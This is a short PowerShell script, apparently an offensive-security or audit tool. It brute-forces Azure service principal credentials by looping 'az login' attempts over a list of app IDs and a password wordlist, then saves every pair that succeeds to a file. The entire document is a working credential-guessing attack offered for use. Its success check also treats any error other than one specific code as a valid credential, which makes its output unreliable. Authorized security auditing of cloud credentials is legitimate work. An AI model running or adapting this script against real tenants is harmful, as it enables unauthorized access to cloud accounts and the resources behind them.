# You will need a list of service principal appIDs for this script
# This script is useful for enviroments that use terraform and manually set the password policy for service principal. N.B if you are fully aware that 
# passwords were created from the Azure Portal no need to run this. Password created in Azure Portal are ~14 characters minimum

#provide the file name with the servicePrincipals you would like brute force
$appIDs = Get-Content ./ServicePrincipal.txt

#password list using to bruteforce
$passwordLst = Get-Content ./pass.txt

# supply a valid tenant ID. No need to authenticate
$tenantID = 

$passwordAttempt = 0


foreach ($id in $appIDs) {    
    foreach ($pass in $passwordLst) {
        $Res = az login --service-principal -u $id -p $pass --tenant $tenantID 2>&1

        #redirect Error
        if ($Res -match 'AADSTS7000215') {
            Write-Output "$App Id: $id and cracking attempts $passwordAttempt. Trying $pass"
            $passwordAttempt ++
            continue
        }
        else {
            Write-Output "[+] Found Valid Service Principal Credential App Id:$id and Password: $pass"
            Write-Output "$id : $pass" | Out-File -Append "./bruteforced-ServicePrincipals.txt"
        }

    }
    Write-Output "-----Testing new App Registration ID: $id ------"
    $passwordAttempt = 0
}

Write-Output "Output written to file ./bruteforced-ServicePrincipals.txt"